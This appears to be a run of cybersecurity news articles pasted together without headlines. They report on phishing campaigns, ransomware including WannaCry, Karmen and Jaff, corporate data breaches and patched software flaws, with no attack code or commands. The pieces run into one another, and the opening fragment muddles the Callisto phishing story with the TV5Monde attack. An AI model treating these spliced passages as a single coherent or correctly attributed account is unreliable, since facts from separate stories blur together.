Research published by cybersecurity firm F-Secure suggested the attack was a “spear-phishing” campaign in which people are sent targeted emails with a link to a false login page to trick users into giving up their username and password. 
The hackers created websites that looked like legitimate Foreign Office websites, including those for accessing an internal email account online.
The scam is believed to have been perpetrated by hackers who call themselves the Callisto Group. 
F-Secure said it did not know whether the attack was successful and the National Cyber Security Centre did not say whether data had been stolen.
It was discovered after the spy agency analysed a successful attack on the French broadcaster TV5Monde in 2015.
The group forced the channel’s scheduled programming off air for 18 hours and replaced them with a screen showing the terror group’s flag. 
The inference with the UK’s government follows on from an ongoing probe into the Kremlin’s influence on the US elections last year. 
Hacking groups such as DC Leaks, Fancy Bears and Guccifer 2.0 who were responsible for the leaking of damaging information about the Democrat party.
The most significant attack, the leaking of thousands of private emails between senior members of the DNC to Wikileaks by Fancy Bears, lead to the resignation of DNC Chair Debbie Wasserman-Schultz.

Cybercriminals have another easy-to-use ransomware kit to add to their arsenals, thanks to a new variant called Karmen that hackers can buy on the black market for $175.
A Russian-speaking user called DevBitox has been advertising the ransomware in underground forums, security firm Recorded Future said in a blog post on Tuesday.  
Karmen is what experts call ransomware-as-a-service -- a particularly worrisome trend. Amateur hackers with little technical know-how can buy access to them, and in return, they’ll receive a whole suite of web-based tools to develop their own ransomware attacks.
In Karmen's case, it offers an easy-to-use dashboard interface. Buyers can modify the ransomware, view what machines they've infected, and see how much they’ve earned.
To spread ransomware, hackers will often rely on spam emails with an attachment or a link to a website that contains malicious coding. Once it infects a computer, the ransomware will then encrypt the files hosted inside. To release the files, victims will have to pay up, usually in bitcoin.
DevBitox, one of the developers behind Karmen, has posted messages in various forums saying that Russian and English language versions of the ransomware-as-a-service are available.
The dashboard to the Karmen ransomware-as-a-service.
So far, the hacker has sold 20 copies of Karmen, according to Recorded Future, which noted that the first infections of the ransomware variant occurred as early as December in Germany and the U.S.
The $175 fee is a one-time upfront payment, said Andrei Barysevich, a director at Recorded Future. “This lowers the barrier for other criminals to carry out ransomware attacks, and allows buyers to retain 100 percent of payments from their infected victims,” he added.
However, victims hit with the Karmen ransomware have recourse. That’s because the malicious coding is derived from Hidden Tear, an open source ransomware project.
Cybercriminals have been using Hidden Tear to build their own ransomware variants. However, security experts have been responding with free decryption tools designed to release computers of the infections.
Michael Gillespie, a security researcher, has developed his own decryption key generator that can address ransomware built from Hidden Tear. He advises that victims contact him for help. Gillespie has also developed a site that can diagnose what kind of ransomware has infected a computer, and offers advice on how it might be fixed.    
No More Ransom is another site with free tools that can decrypt certain ransomware infections.
Security experts also recommend that businesses make routine backups of their important systems, in the event of a ransomware attack.

Just a friendly reminder that phishing scams which spoof the boss and request W-2 tax data on employees are intensifying as tax time nears. The latest victim shows that even cybersecurity experts can fall prey to these increasingly sophisticated attacks.
On Thursday, March 16, the CEO of Defense Point Security, LLC — a Virginia company that bills itself as “the choice provider of cyber security services to the federal government” — told all employees that their W-2 tax data was handed directly to fraudsters after someone inside the company got caught in a phisher’s net.
Alexandria, Va.-based Defense Point Security (recently acquired by management consulting giant Accenture) informed current and former employees this week via email that all of the data from their annual W-2 tax forms — including name, Social Security Number, address, compensation, tax withholding amounts — were snared by a targeted spear phishing email.
“I want to alert you that a Defense Point Security (DPS) team member was the victim of a targeted spear phishing email that resulted in the external release of IRS W-2 Forms for individuals who DPS employed in 2016,” Defense Point CEO George McKenzie wrote in the email alert to employees. “Unfortunately, your W-2 was among those released outside of DPS.”
W-2 scams start with spear phishing emails usually directed at finance and HR personnel. The scam emails will spoof a request from the organization’s CEO (or someone similarly high up in the organization) and request all employee W-2 forms.
Defense Point did not return calls or emails seeking comment. An Accenture spokesperson issued the following brief statement:  “Data protection and our employees are top priorities. Our leadership and security team are providing support to all impacted employees.”
Fraudsters who perpetrate tax refund fraud prize W-2 information because it contains virtually all of the data one would need to fraudulently file someone’s taxes and request a large refund in their name. Scammers in tax years past also have massively phished online payroll management account credentials used by corporate HR professionals. This year, they are going after people who run tax preparation firms, and W-2’s are now being openly sold in underground cybercrime stores.
Tax refund fraud affects hundreds of thousands, if not millions, of U.S. citizens annually. Victims usually first learn of the crime after having their returns rejected because scammers beat them to it. Even those who are not required to file a return can be victims of refund fraud, as can those who are not actually due a refund from the IRS.

US prosecutors have charged a Lithuanian man with engaging in an email fraud scheme in which he bilked two US-based companies out of more than US$100 million by posing as an Asian hardware vendor.
Evaldas Rimasauskas, 48, was arrested late last week by Lithuanian authorities, Manhattan federal prosecutors said on Tuesday. Rimasauskas does not yet have legal counsel, a spokesman for the prosecutors said.
The alleged scheme is an example of a growing type of fraud called “business email compromise”, in which fraudsters ask for money using emails targeted at companies that work with foreign suppliers or regularly make wire transfers. It is a variation on the common “phishing” scam, but on a massive scale.
The FBI said last June that since October 2013, US and foreign victims have made 22,143 complaints about business email compromise scams involving requests for almost US$3.1 billion in transfers.
In an indictment unsealed on Tuesday, prosecutors said that to carry out his scheme, which they said began around 2013 or earlier, Rimasauskas registered a company in Latvia with the same name as an Asian computer hardware manufacturer.
He then sent emails to employees of the two unnamed victim companies, described as multinational internet firms, asking them to wire money that they actually owed to the Asian company to the sham Latvian company’s accounts, prosecutors said.
The victim companies are described as a multinational technology company and a multinational social media company.
After they wired money to Rimasauskas’s Latvian company, Rimasauskas quickly transferred the funds to different accounts around the world, including in Latvia, Cyprus, Slovakia, Lithuania, Hungary and Hong Kong, prosecutors said.
In order to conceal his fraud from banks that handled the transfers, Rimasauskas forged invoices, contracts and letters purportedly signed by executives at the two victim companies, according to prosecutors.
Rimasauskas is charged with wire fraud and money laundering, which each carry a maximum prison sentence of 20 years, and identify theft, which carries a mandatory minimum sentence of two years.
Acting US Attorney Joon H. Kim said: “From half a world away, Evaldas Rimasauskas allegedly targeted multinational internet companies and tricked their agents and employees into wiring over US$100 million to overseas bank accounts under his control.
“This case should serve as a wake-up call to all companies – even the most sophisticated – that they too can be victims of phishing attacks by cyber criminals.”

DocuSign, with over 100 million users, is one of the world’s largest providers of electronic signature technology and digital transaction management. Recently, DocuSign acknowledged that they have been the victim of a malware phishing attack. The data breach happened at one DocuSign computer system location and has since been contained. While short-lived, the malware was able to obtain many customer and user emails from the DocuSign database. Fortunately, the breach was limited to email addresses; no documents or further customer information was accessed in the attack.
The attackers have begun sending out malicious emails with the company’s branding to DocuSign customers and users. In an alert on the DocuSign website, the company shared that it is tracking these emails which carry a downloadable Microsoft Word document harboring malware to attack the user’s system.  The email subject line has been known to read: “Completed: docusign.com – Wire Transfer Instructions for recipient-name Document Ready for Signature.”
How to protect yourself
    If you are not expecting an email via DocuSign, do not click on the link.
    If you are expecting a document, but are unsure of the source, you can access your document directly by visiting docusign.com. Every legitimate DocuSign email has a code which the user can enter on the website to access their document.
    DocuSign has asked that people forward suspicious emails to spam@docusign.com then delete the email from their inboxes.
It is important to remember that DocuSign will never request a customer or user to open a PDF, Microsoft Office document or ZIP file in an email.

Cyber security researchers on Monday pointed to code in a ""ransomware"" attack that could indicate a link to North Korea.
Symantec and Kaspersky Lab each cited code that was previously used by a hacker collective known as the Lazarus Group, which was behind the high-profile 2014 hack of Sony that was also blamed on North Korea.
But the security firms cautioned that it is too early to make any definitive conclusions, in part because the code could have been merely copied by someone else for use in the current event.
The effects of the ransomware attack appeared to ease Monday, although thousands more computers, mostly in Asia, were hit as people signed in at work for the first time since the infections spread to 150 countries late last week.
Health officials in Britain, where surgeries and doctors' appointments in its national health care system had been severely impacted Friday, were still having problems Monday. But health minister Jeremy Hunt said it was ""encouraging"" that a second wave of attacks had not materialized.
He said ""the level of criminal activity is at the lower end of the range that we had anticipated.""
In the United States, Tom Bossert, a homeland security adviser to President Donald Trump, told the ABC television network the global cybersecurity attack is something that ""for right now, we've got under control.""
He told reporters at the White House that ""less than $70,000"" has been paid as ransom to those carrying out the attacks. He urged all computer users to make sure they install software patches to protect themselves against further cyberattacks.
In the television interview, Bossert described the malware that paralyzed 200,000 computers running factories, banks, government agencies, hospitals and transportation systems across the globe as an ""extremely serious threat.""
Cybersecurity experts say the hackers behind the ""WannaCry"" ransomware, who demanded $300 payments to decrypt files locked by the malware, used a vulnerability that came from U.S. government documents leaked online. The attacks exploited known vulnerabilities in older Microsoft computer operating systems.
During the weekend, Microsoft president Brad Smith said the clandestine U.S. National Security Agency had developed the code used in the attack.
Bossert said ""criminals,"" not the U.S. government, are responsible for the attacks. Like Bossert, experts believe Microsoft's security patch released in March should protect networks if companies and individual users install it.
Russian President Vladimir Putin said his country had nothing to do with the attack and cited the Microsoft statement blaming the NSA for causing the worldwide cyberattack.
""A genie let out of a bottle of this kind, especially created by secret services, can then cause damage to its authors and creators,"" Putin said while attending an international summit in Beijing. He said that while there was ""no significant damage"" to Russian institutions from the cyberattack, the incident was ""worrisome.""
""There is nothing good in this and calls for concern,"" he said.
Even though there appeared to be a diminished number of attacks Monday, computer outages still affected segments of life across the globe, especially in Asia, where Friday's attacks occurred after business hours.
China 
China said 29,000 institutions had been affected, along with hundreds of thousands of devices. Japan's computer emergency response team said 2,000 computers at 600 locations were affected there.
Universities and other educational institutions appeared to be the hardest hit in China. China's Xinhua News Agency said railway stations, mail delivery, gas stations, hospitals, office buildings, shopping malls and government services also were affected.
Elsewhere, Britain said seven of the 47 trusts that run its national health care system were still affected, with some surgeries and outpatient appointments canceled as a result. In France, auto manufacturer Renault said one of its plants that employs 3,500 workers stayed shut Monday as technicians dealt with the aftermath of the Friday attacks.
Security patches 
Computer security experts have assured individual computer users who have kept their operating systems updated that they are relatively safe, but urged companies and governments to make sure they apply security patches or upgrade to newer systems.
They advised those whose networks have been effectively shut down by the ransomware attack not to make the payment demanded, the equivalent of $300, paid in the digital currency bitcoin. 
However, the authors of the ""WannaCry"" ransomware attack told their victims the amount they must pay will double if they do not comply within three days of the original infection, by Monday in most cases. The hackers warned that they will delete all files on infected systems if no payment is received within seven days.

A new malware program that targets macOS users is capable of spying on encrypted browser traffic to steal sensitive information.
The new program, dubbed OSX/Dok by researchers from Check Point Software Technologies, was distributed via email phishing campaigns to users in Europe.
One of the rogue emails was crafted to look as if it was sent by a Swiss government agency warning recipients about apparent errors in their tax returns. The malware was attached to the email as a file called Dokument.zip.
Once installed on a Mac, OSX/Dok displays a fake and persistent notification about a system security update that needs to be installed. Users who agree to install the update will be prompted for their administrator password.
Once the malware obtains elevated privileges, it will make the active user a permanent administrator so the OS will never ask for the password again when the malware executes privileged commands in the background.
Dok will also modify the system's network settings to route web traffic through a proxy server controlled by the attackers and located on the Tor anonymity network. In order for this to work, it also installs a Tor client that's started automatically.
The reason why web traffic is routed through a proxy server is to perform a man-in-the-middle (MitM) attack and decrypt secure HTTPS connections. This is achieved by installing a rogue root certificate on the system that is then used to decrypt and re-encrypt HTTPS connections when they pass through the proxy.
With this method, users will continue to see the SSL visual indicator in their browser when they access HTTPS websites and the browser will not complain about untrusted certificates.
The ability to snoop on HTTPS traffic allows attackers to steal sensitive information like passwords for email; social media and online banking accounts; credit card details entered on shopping websites; personal and financial information entered into web forms; and more.
With more than half of all web traffic in an average user's browser now encrypted, it's not surprising that attackers are resorting to man-in-the-middle techniques to capture sensitive data.
This and other capabilities make Dok one of the most sophisticated malware programs targeting macOS to date, not counting spy programs created or used by nation states and law enforcement agencies.
""We have been and still are in direct contact with Apple [employees] who are very helpful and responsive,"" Yaniv Balmas, Check Point's malware research team leader, said via email. ""With Apple’s cooperation, we believe this specific campaign is now futile and does no longer pose any threat to Mac users.""

The recent WannaCry ransomware attack, which spread to more than 100 countries, is only the beginning in a series of similar attacks, according to Cătălin Coșoi, head of the Bitdefender’s investigation team coordinating the relations of the company with institutions such as NATO, Europol, Interpol, or national response centers to cyber-security incidents, Agerpres reported.
Romanian group Bitdefender is a global technology security company which provides cyber security solutions to more than 500 million users across businesses and homes in more than 150 countries.
“The WannaCry 1.0 and 2.0 versions, a type of fast-spreading ransomware that blocks the data of the users and then asks for a ransom, are only the beginning in a series of similar, ample attacks, making WannaCry one of the most significant IT threats of the next 12 months. The amplitude of the WannaCry phenomenon can be reduced rapidly if Microsoft decides to push an update to all users who do not use the most recent version of the Windows operating system. This measure has been taken before, and the reach of the WannaCry threat could justify this again, in a controlled and coordinated method, with the support of authorities and of cyber-security companies. Although the measure of updating without the user’s permission would force the limits of current legislation, the Bitdefender expertise in cyber-security has proven that, many times, current regulations do not keep up with the evolution of the criminal phenomenon. This is why cooperation between authorities and the IT security industry is more needed than ever,” Coșoi explained.
The computers in public institutions, hospitals, and other social sector organizations are not usually updated with the most recent OS system, the Bitdefender representative said.
“If the respective terminals are not infected by ransomware now, they will remain vulnerable to other threats, including cyber-attacks sponsored by other states. In the event of such a scenario, ransomware would be a fortunate case, because it produces palpable consequences. On the other hand, the advanced threats used for espionage purposes could exploit the vulnerability of the operating system and systematically steal information for a long time, without being detected,” Coșoi explained.
A global WannaCry ransomware attack took place last weekend, affecting some 100 countries. The attack, which has been called “unprecedented” by Europol, has affected hospitals in Britain and Spanish telecom operator Telefonica, as well as courier service FedEx in the US. Car-maker Dacia had to halt its local production activities because of the attack.
WannaCry is a ransomware attack which exploits a vulnerability of the Microsoft Windows operating system. Once installed on the infected computer, the virus encrypts the users’ files and demands payment in bitcoin to allow the victims to access their data.

The Intercontinental Hotels Group data breach previously announced in February as affecting 12 hotels in the chain has proven to have been far more extensive than was first thought.
Last week the group announced that the breach affected guests that used their credit cards to pay at franchisee hotels across the United States and in Puerto Rico between September 29, 2016 and December 29, 2016.
According to the chain’s website, the Intercontinental Hotels Group data breach potentially affected guests who stayed at its Holiday Inn, Holiday Inn Express, Crowne Plaza, Staybridge Suites, Candlewood Suites, Hotel Indigo, and InterContinental Hotels. The full list of hotels that have potentially been affected by the malware incident has been listed on the IHG website. In total, 1,184 of the group’s hotels have potentially been affected.
The Intercontinental Hotels Group data breach involved malware that had been downloaded onto its systems, which was capable of monitoring payment card systems and exfiltrating payment card data. It does not appear that any other information other than card details and cardholders’ names were stolen by the attackers.
The hotel group does not believe the data breach extended past December 29, 2016, although that cannot be entirely ruled out as it took until February/March for all of the affected hotels to be investigated and for confirmation to be received that the malware had been removed.
Prior to the malware being installed, IHG had started installing the OHG Secure Payment Solution (SPS), which provides point to point encryption to prevent incidents such as this from resulting in the theft of clients’ data.  Had the process started sooner, the Intercontinental Hotel Group data breach could have been prevented.
Hotels that had implemented the SPS prior to September 29, 2016 were not affected and those that had implemented the solution between September 29, 2016 and December 29, 2016 stopped the malware from being able to locate and steal credit card data. In those cases, only clients that used their credit cards at affected hotels between September 29, 2016 and when the SPS system was installed were affected.
Intercontinental Hotels Group Data Breach One of Many Affecting the Hospitality Sector
The Intercontinental Hotels Group data breach stands out due to the extent to which the group was affected, with well over 1,100 hotels affected. However, this is far from the only hotel group to have been affected by POS malware. Previous incidents have also been reported by Hard Rock Hotels, Hilton Hotels, Omni Hotels & Resorts and Trump Hotels.
Hotels, in particular hotel chains, are big targets for cybercriminals due to the size of the prize. Many hotel guests choose to pay for their rooms and services on credit cards rather than in cash, and each hotel services many thousands – often tens of thousands – of guests each year.
Globally, IHG hotels service more than 150 million guests every year, which is a tremendous number of credit and debit cards. Such a widespread malware infection would be highly lucrative for the attackers. Credit card numbers may only sell for a couple of dollars a time, but with that number of guests, an attack such as this would be a huge pay day for the attackers.

News Corp is a network of leading companies in the worlds of diversified media, news, education, and information services.
Addresses, names and phone numbers for staff were accessed in the data breach
SPORTS Direct failed to tell its workers about a major data breach that saw personal information accessed by hackers.
A cyber attacker gained access to internal systems containing details for phone numbers, names and home and email addresses of the retail giant's 30,000 staff members.
But according to The Register, workers still haven't been told about the breach, which took place in September.
Sports Direct discovered the attack three months later after a phone number was left on the company's internal site with a message encouraging bosses to make contact.
Chiefs filed a report with the Information Commissioner's office after it became aware that personal information had been compromised.
But as there was no evidence the data had been shared, Sports Direct didn't report the breach to staff.
The blunder is the latest in a string of controversies surrounding the sporting goods retailer.
Allegations also surfaced of some workers being promised permanent contracts in exchange for sexual favours.
Committee chairman Iain Wright said evidence heard by MPs last year suggested Sports Direct's working practices ""are closer to that of a Victorian workhouse than that of a modern, reputable High Street retailer"".
In November, six MPs from the Business and Skills Committee said attempts were made to record their private discussions when they visited Sport Direct to investigate working practices.

The Internet Systems Consortium patched the BIND domain name system this week, addressing a remotely exploitable vulnerability it considers high severity and said could lead to a crash.
The issue affects servers that use both the DNS64 and RPZ function simultaneously.
DNS64 is a mechanism for synthesizing AAAA records from A records.
It’s traditionally used to allow IPv6-only clients to receive IPv6 addresses proxied to IPv4 addresses.
The RPZ mechanism is used by Domain Name System recursive resolvers to allow for the customized handling of the resolution of collections of domain name information.
Versions 9.8.8, 9.9.3-S1, 9.9.3, 9.9.10b1, 9.10.0, and 9.10.5b1, 9.11.0 are all considered vulnerable, according to the ISC.
When servers use both mechanisms simultaneously, a vulnerability (CVE-2017-3135) that stems from query processing could result in an inconsistent state, triggering either an INSIST assertion failure or an attempt to read through a NULL pointer, according to a security advisory published Wednesday.
The INSIST assertion failure could lead to a subsequent abort, ISC said, while the NULL pointer in some instances can lead to a segmentation fault, which causes the process to be terminated.
Ramesh Damodaran and Aliaksandr Shubnik, engineers at Infoblox, a Silicon Valley firm that does DNS, DHCP and IP management, uncovered the vulnerability and reported it to the ISC.
Damodaran previously helped identified an unspecified packet processing remote denial of service vulnerability in BIND 9.
The Internet Systems Consortium patched the BIND domain name system this week, addressing what it calls a critical error condition in the software.
Researchers find industrial control system malware similar to BlackEnergy, Havex, and Stuxnet going undetected on Google VirusTotal for years.
The Internet Systems Consortium (ISC) announced it is planning to patch versions of its DHCP to mitigate a denial of service vulnerability.

Mere days after thousands of MongoDB databases were hit by ransomware attacks, cybercriminals have set their sights on ElasticSearch servers, according to reports.
Hackers have reportedly hijacked insecure servers exposed to the internet with weak and easy-to-guess passwords.
ElasticSearch is a Java-based search engine, commonly used by enterprises for information cataloguing and data analysis.
According to security researcher Niall Merrigan, who has been monitoring the attacks, the cybercriminals are currently closing in on around 3,000 ElasticSearch servers.
Merrigan told IBTimes UK: ""We found the first one on the 12th of Jan and then started tracking the different IOCs (Indicators Of Compromise).
The first actor has levelled off and looks like it has stopped.
However, a second and third actor have joined in and are continuing to compromise servers.
""Attackers are finding open servers where there is no authentication at all.
This can be done via a number of services and tools.
Unfortunately, system admins and developers have been leaving these unauthenticated systems online for a while and attackers are just picking off the low hanging fruit right now.""
The recent MongoDB attacks saw hackers demand ransom and erasing data to ensure victims' compliance.
In the ongoing ElasticSearch attacks, the cybercriminals demand a ransom of 0.2 Bitcoins, according to a report by BleepingComputer.
However, according to Merrigan, $20,000 in Bitcoins have already been paid by victims of the MongoDB attack.
Despite paying the ransom, the victims have not received their data back.

WASHINGTON — President Donald Trump’s homeland security adviser said Monday that the malware that has infected 300,000 computers in 150 countries is “in the wild,” but so far has not infiltrated U.S. government systems.
Tom Bossert, assistant to the president for homeland security and counterterrorism, said three variants of the malware have been discovered and the U.S. government was closely monitoring the situation with officials in Britain.
“Overall, the U.S. infection rate has been lower than many parts of the world, but we may still see significant impacts in additional networks as these malware attacks morph and change,” Bossert told reporters at the White House. “We had a small number of affected parties in the U.S., including FedEx. As of today, no federal systems are affected.”
Computers across the world were locked up Friday and users’ files held for ransom when dozens of countries were hit in a cyber-extortion attack that targeted hospitals, companies and government agencies. Cybersecurity experts say the unknown hackers who launched the “ransomware” attacks used a hole in Microsoft software that was discovered by the National Security Agency and exposed when NSA documents were leaked online.
The Department of Homeland Security is taking the lead on the investigation in the United States.
The Cyber Threat Intelligence Integration Center is keeping the U.S. government informed about classified information concerning the investigation, he said.
If Americans follow the patching information issued by the FBI, Microsoft and the Homeland Security Department, they will be protected from the malware and the variants, Bossert said.
“While it would be satisfying to hold accountable those responsible for this hack — something that we are working on quite seriously — the worm is in the wild, so to speak at this point, and patching is the most important message as a result,” he said. “Despite appearing to be criminal activity intended to raise money, it appears that less than $70,000 has been paid in ransoms and we are not aware of payments that have led to any data recovery.”
Neither the FBI or NSA would comment Monday.
Trump signed an executive order on Friday aimed at boosting the nation’s cybersecurity, as well as building and maintaining “a modern, secure, and more resilient executive branch IT architecture.”
“The trend is going in the wrong direction in cyberspace, and it’s time to stop that trend and reverse it on behalf of the American people,” Bossert said after that signing last week. “We have seen increasing attacks from allies, adversaries, primarily nation-states, but also non-nation-state actors, and sitting by and doing nothing is no longer an option.”                
Homeland Security Advisor Tom Bossert announces May 11 that Trump signed an executive order to bolster the government's cyber security and protect the nation's critical infrastructure from cyber attacks, during a news briefing at the White House in Washington, D.C.

Infamous Necurs botnet seen sending spam emails containing new ransomware to millions of potential victims in just a few hours.
A new form of ransomware is indiscriminately targeting millions of PCs, spread by the prolific botnet behind one of the most successful forms of ransomware in the world.
The new ransomware is called Jaff and given that it appears to be heavily mimicking tactics of the infamous Locky - the most successful ransomware family of 2016 - it has the potential to become a major nuisance.
It's also brazen in its ransom demands, demanding victims pay 1.79 Bitcoins - currently $3,300 - in order to regain access to the infected network and encrypted files.
It's an ambitious ransom - most forms of ransomware want a payment of between $500 and $1000 - but the authors are likely to be aware that many organisations are willing to give in and pay to avoid losing business-critical files.
As noted by cybersecurity researchers at Forcepoint, the Jaff campaign sprung to life on May 11, using the Necurs botnet to send millions of spam emails emails to targets across the globe in the space of just a few hours.
The malicious email itself is sent with a subject line referring to a receipt or to a fake document, with the pattern involving the words PDF, Scan, File, Copy or Document followed by an underscore and a string of at least four numbers - four example, one subject line seen by researchers was 'Copy _293636'
Attached to this email is a PDF document containing an embedded DOCM file and a malicious Macro script. If this is run, the ransomware payload is executed and Jaff targets and encrypts a wide variety of file extensions, renaming them all to end in .jaff.
While the attack might seem basic - especially compared with targeted spear-phising attacks - the sheer number of messages sent out means that even just a tiny percentage of targets open the email, download the attachment and enable the macros, this new ransomware could have a sizeable impact.
As with other ransomware attacks, the infected victim sees their desktop changed to a ransom note and they're directed to instructions, telling them their files are encrypted and that they must visit a dark web address in order to pay to get their files back.
It's this combined with how the ransomware is spread by Necurs - which leads researchers to suggest that there's a connection between Jaff and Locky: the Jaff decryptor website and the Locky decryptor website look almost identical. 
Researchers also note that while the code behind Jaff is less sophisticated than Locky, it carries one major similarity - the ransomware will delete itself from the infected machine if the local language is Russian. If the ransomware does not want to target Russian users this might suggest it originate from Russia and the developers don't want to cause trouble in their own neighbourhood.
While researchers can't say for certain if Jaff is definitively linked to the gang behind Locky but those behind it have the funding and skills required to carry out a sophisticated campaign.
""What is clear, given the volume of messages sent, is that the actors behind the campaign have expended significant resources on making such a grand entrance,"" said Forcepoint researchers.

Researchers have discovered over 300 cybersquatting domains masquerading as real UK banking sites, many of which are designed to trick customers into handing over personal details.
DomainTools used its PhishEye tool to search for domains registered by individuals to mimic those of Barclays, HSBC, Natwest, Lloyd’s and Standard Chartered.
It found a whopping 324 registered domains abusing the trademarks of these lenders, including lloydstbs[.]com, standardchartered-bank[.]com and barclaysbank-plc[.]co.uk.
“Imitation has long been thought to be the sincerest form of flattery, but not when it comes to domains,” explained DomainTools senior security researcher, Kyle Wilhoit. “While domain squatters of the past were mostly trying to profit from the domain itself, these days they’re often sophisticated cyber-criminals using the spoofed domain names for more malicious endeavors.”
Cybersquatting can be used for a variety of ends, including redirecting the user to pay-per-click ads for the victim company’s competitors; for-profit survey sites, or ransomware and other forms of drive-by malware.
However, one of the most common is to create a phishing page similar to the spoofed bank’s original, which will ask for log-ins or other banking and personal information.
This years’ Verizon Data Breach Investigations Report (DBIR) claimed phishing has soared in popularity, present in a fifth (21%) of attacks, up from just 8% last year.
“Many [cybersquatters] will simply add a letter to a brand name, such as Domaintoools.com, while others will add letters or an entire word such as ‘login’ to either side of a brand name. Users should remember to carefully inspect every domain they are clicking on or entering in their browser. Also, ensure you are watching redirects when you are going from site to site,” advised Wilhoit.
“Brands can and should start monitoring for fraudulent domain name registrations and defensively register their own typo variants. It is better to lock down typo domains than to leave them available to someone else and at an average of £12 per year per domain, this is a relatively cheap insurance policy.”

Virgin Media has – perhaps rather belatedly – fixed a series of vulnerabilities in its Super Hub 3.0 home broadband router modem, after they were reported more than 18 months ago.
Balazs Bucsay, managing security consultant at NCC Group, says that after receiving one of the devices as a home customer and examining it for a few hours, he was quickly able to find a remote command execution bug. He uncovered many others during the following days.
Eventually, he says, he was able to create a full chain of exploits that made it possible to perform a remote authentication as an administrator on the router.
This could potentially allow a hacker to take control of millions of these devices, installing backdoors in a way that would be extremely hard to find and investigate.
“After hacking into my own Super Hub 3.0, I was able to find multiple security flaws within the router’s firmware and combine these to create an exploit that could have been hidden within webpages and sent to other unsuspecting owners via scam emails or other methods,” Bucsay tells The Daily Swig.
“If customers had opened the webpages and activated the exploit, hackers could have gained unauthorized access to their modems and other devices on the victim’s home network, enabling them to spy on online activity and even execute their own commands on the devices.”
Bucsay reported the vulnerabilities to Virgin Media in March 2017, but says they weren't fixed until the end of July this year. “The proposed roll-out date was postponed many times,” he says.
However, a Virgin Media spokeswoman defended the company’s actions.
“The online security of our customers is a top priority for Virgin Media and the issues described by NCC have been fixed,” she told The Daily Swig.
“We have seen no evidence that these advanced technical exploits, carried out by NCC as a proof of concept, were used maliciously to impact customers.”
With the patch rolled out in August, Super Hub 3.0 users don’t need to do anything extra to protect themselves.
“However, this research should remind consumers that no connected device is inherently secure, and that they should consider additional security measures around their home network, such as using password managers and different passwords for each device and service,” Bucsay warns.
He also urged internet service providers to be more proactive in checking the security of any third-party devices they use.

Microsoft has issued an emergency, out-of-band patch for an Internet Explorer zero-day that was being actively exploited in targeted attacks.
The company says that it learned about the vulnerability through a report from Google. CVE-2018-8653 affects a range of versions of Internet Explorer from 9 to 11, across Windows 7 to 10 and Windows Server.
The vulnerability amounts to a remote code execution exploit, and it was first spotted by Google's Threat Analysis Group. Microsoft explains that a problem with Internet Explorer's scripting engine could be exploited by an attacker to execute arbitrary code on a victim's computer.
In a short security advisory, the company says:
Today, we released a security update for Internet Explorer after receiving a report from Google about a new vulnerability being used in targeted attacks.
Customers who have Windows Update enabled and have applied the latest security updates, are protected automatically. We encourage customers to turn on automatic updates.
Microsoft would like to thank Google for their assistance.
In a more detailed security vulnerability posting, Microsoft explains the impact of the problem:
A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerability could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerability could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerability through Internet Explorer and then convince a user to view the website, for example, by sending an email.
The security update addresses the vulnerability by modifying how the scripting engine handles objects in memory.

(Reuters) - Sabre Corp said on Tuesday there had been a breach in its hospitality unit’s hotel reservation system and had hired FireEye Inc’s Mandiant forensics division to probe the incident. 
""The unauthorized access has been shut off and there is no evidence of continued unauthorized activity,"" Sabre said in a statement. 
The company, which offers hotel and airline booking services, said it had informed law enforcement about the breach in its SynXis Central Reservations.  
Sabre does not believe any other system was affected. 
“32,000 properties use Sabre’s reservation system, so the attackers were able to penetrate a single system and potentially access 32,000 additional targets,” said Jeff Hill, Director of Product Management, Prevalent, which manages third-party risk. 
Mandiant did not immediately respond to a request for comment. 
Hotel groups are increasingly coming under attacks from hackers, who seek to steal payment card data. 
InterContinental Hotels Group Plc said last month 1,200 of its franchised hotels in the United States, including Holiday Inn and Crowne Plaza, were victims of a three-month cyber attack. 
Hyatt Hotels Corp, Hilton, and Starwood Hotels, now owned by Marriott International Inc had also been victims of hacking attacks.

A Windows zero-day bug has made the news. By zero-day, it means that a vulnerability has been exposed but it is not yet patched. Darren Allan in TechRadar was one of the tech watchers reporting on the vulnerability, which could occur through a privilege escalation bug.
""The user linked to a page on GitHub which appears to contain a proof-of-concept (PoC) for the vulnerability,"" said Charlie Osborne in ZDNet.
""CERT/CC (the US cybersecurity organization which looks to counter emerging threats) has confirmed that this vulnerability can be leveraged against a 64-bit Windows 10 PC which has been fully patched up to date, "" said TechRadar, in turn referring to a story in The Register,
Richard Chergwin, The Register, had reported that ""CERT/CC vulnerability analyst Will Dormann quickly verified the bug.""
CERT/CC did a formal investigation, and posted an advisory. ""'Microsoft Windows task scheduler contains a vulnerability in the handling of ALPC, which can allow a local user to gain SYSTEM privileges,' the alert stated.""
This can be leveraged to gain SYSTEM privileges. We have confirmed that the public exploit code works on 64-bit Windows 10 and Windows Server 2016 systems. We have also confirmed compatibility with 32-bit Windows 10 with minor modifications to the public exploit code. Compatibility with other Windows versions is possible with further modifications.""
Should we worry? Allan said it is a local bug. The attacker would have to be already logged into the PC to exploit it, or be running code on the machine.
But wait. Though local, Ars Technica's Peter Bright let its readers know what the flaw allows one to do. Not pretty.
Bright wrote that ""The flaw allows anyone with the ability to run code on a system to elevate their privileges to 'SYSTEM' level, the level used by most parts of the operating system and the nearest thing that Windows has to an all-powerful superuser.""
Osborne in ZDNet said that while the impact was limited, ""the public disclosure of a zero-day is still likely a headache for the Redmond giant.""

One tried-and-true technique continues to be hiding malware inside fake versions of popular files, then distributing those fake versions via app stores.
Doing the same via peer-to-peer BitTorrent networks has also long been popular.
But as with so many supposedly free versions of paid-for applications, users may get more than they bargained for.
To wit, last week researchers at the security firm ESET spotted new ransomware - Filecoder.E - circulating via BitTorrent, disguised as a ""patcher"" that purports to allow Mac users to crack such applications as Adobe Premiere Pro CC and Microsoft Office 2016.
As Toronto-based security researcher Cheryl Biswas notes in a blog post: ""For those who torrent, be careful.
ESET says the ransomware can also encrypt any Time Machine backups on network-connected volumes that are mounted at the time of the attack.
If the ransomware infects a system, it demands 0.25 bitcoins - currently worth about $300 - for a decryption key.
